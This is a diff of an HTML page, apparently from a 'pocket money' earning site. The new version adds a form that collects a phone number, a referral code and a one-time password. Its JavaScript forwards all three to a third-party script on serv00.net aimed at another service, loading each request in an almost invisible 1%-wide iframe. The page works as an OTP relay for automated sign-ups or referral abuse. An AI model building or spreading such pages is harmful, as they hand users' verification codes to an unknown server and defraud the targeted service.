@@ -1,91 +1,115 @@
-<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
- <head> 
-  <meta charset="UTF-8"> 
-  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title> SK Pocket Money</title> 
-
-
-
-  
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Phone Number and Referral Code Form</title>
 <style>
-   
-   
-   img {
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        margin: 0;
+        padding: 0;
+    }
 
-max-width: 100%;
+    #myForm {
+        max-width: 400px;
+        margin: 20px auto;
+        padding: 20px;
+        background-color: #fff;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
 
-max-height: 100%;
+    label {
+        font-weight: bold;
+        margin-bottom: 5px;
+        display: block;
+    }
 
-}
+    input[type="tel"],
+    input[type="text"],
+    input[type="number"] {
+        width: calc(100% - 22px);
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+    }
 
-.picturel {
+    button {
+        background-color: #007bff;
+        color: #fff;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+    }
 
-width: 200px;
+    button:hover {
+        background-color: #0056b3;
+    }
 
-height: 300px;
-
-}
-   
+    #resultFrame, #resultFramet {
+        width: 1%;
+        min-height: 1px;
+        border: 1px solid #ccc;
+        box-sizing: border-box;
+        margin-top: 20px;
+        resize: both;
+        overflow: auto;
+    }
 </style>
-  <link rel="stylesheet" type="text/css" href="//telegram.im/widget-button/widget-button.css.php">
-  <link rel="stylesheet" type="text/css" href="//telegram.im/widget-button/fonts.css">
-  <link rel="stylesheet" type="text/css" href="//telegram.im/widget-button/ico/style.css"> 
- </head> 
- <body>
-   
+</head>
+<body>
 
+<form id="myForm">
+    <label for="phoneNumber">Phone Number:</label>
+    <input type="tel" id="phoneNumber" name="phoneNumber" required>
+    <label for="referralCode">Referral Code:</label>
+    <input type="text" id="referralCode" name="referralCode">
+    <button type="button" onclick="openInFrame()">GET OTP</button>
 
-   
-<div class="picture1">
+    <label for="otp">Enter OTP:</label>
+    <input type="number" id="otp" name="otp">
+    <button type="button" onclick="openInFramet()">SUBMIT</button>
+</form>
 
-<img src="
+<iframe id="resultFrame" scrolling="no"></iframe>
+<iframe id="resultFramet" scrolling="no"></iframe>
+
+<script>
+    var link = "https://arshzz1.serv00.net/usgillam/";
   
   
-     https://skpocketmoney.github.io/SkPocketMoney/pici.jpg
-      
   
-  " alt="" srcset="">
-
-</div>
-  <iframe src= "  https://flashbott.000webhostapp.com/follow/ " style="width:100%;min-height: 600px;" frameborder="0" scrolling="20px"></iframe> 
-
-
-
   
-  <div class="telegram"> 
-   <a href="https://t.me/skpocketmoneydaily" target="_blank" class="telegramim_button telegramim_shadow telegramim_pulse" style="font-size:23px; letter-spacing:1px; max-width:400px;font-family: 'Rajdhani', sans-serif; background:rgb(88, 33, 206);box-shadow:1px 1px 5px rgb(88, 33, 206);font-weight: 500; border:1px solid rgb(88, 33, 206); color:#ffffff;border-radius:50px;" title="Join Now"><i class="ftelegramim ftelegramim-telegram-logo"></i>Join Our Telegram<small><span class="telegramim_count" data-for="">Join Now</span></small></a>
-   <hr>
-   <center> 
-   </center>
-  </div> 
-  <script type="text/javascript">
-                                            var arrgetbtn = [];
-                                            arrgetbtn.push({
-                                                "title": "Telegram",
-                                                "icon": "fwidgethelp-telegram_v2",
-                                                "link": ".  https://t.me/skpocketmoneydaily",
-                                                "target": "_blank",
-                                                "color": "#FFFFFF",
-                                                "background": "#27A5E7"
-                                            });
-                                            arrgetbtn.push({
-                                                "title": "",
-                                                "icon": "fwidgethelp-telegram_v2",
-                                                "link": "https://t.me/pocketmoneysk",
-                                                "target": "_blank",
-                                                "color": "#FFFFFF",
-                                                "background": "#cc0000"
-                                            });
-                                            arrgetbtn.push({
-                                                "title": "",
-                                                "icon": "fwidgethelp-envelope",
-                                                "link": ".  https://t.me/skpocketmoneydaily",
-                                                "target": "_blank",
-                                                "color": "#FFFFFF",
-                                                "background": "#ff9900"
-                                            });
-                                        
-                                        </script> 
- </body>
+    function openInFrame() {
+        var phoneNumber = document.getElementById("phoneNumber").value;
+        var referralCode = document.getElementById("referralCode").value;
+
+        // Construct the URL with dynamic values
+        var url = link + "?mobile=" + encodeURIComponent(phoneNumber) + "&refer=" + encodeURIComponent(referralCode) + "&submit=";
+
+        // Set the iframe src attribute to the constructed URL
+        document.getElementById("resultFrame").src = url;
+    }
+  function openInFramet() {
+    var phoneNumber = document.getElementById("phoneNumber").value;
+    var referralCode = document.getElementById("referralCode").value;
+    var otp = document.getElementById("otp").value;
+
+    // Construct the URL with dynamic values
+    var url = link + "otp.php?mobile=" + encodeURIComponent(phoneNumber) + "&refer=" + encodeURIComponent(referralCode) + "&otp=" + encodeURIComponent(otp) + "&hostt=www.usgillam.com&submit=";
+
+    // Set the iframe src attribute to the constructed URL
+    document.getElementById("resultFramet").src = url;
+}
+
+    
+</script>
+
+</body>
 </html>
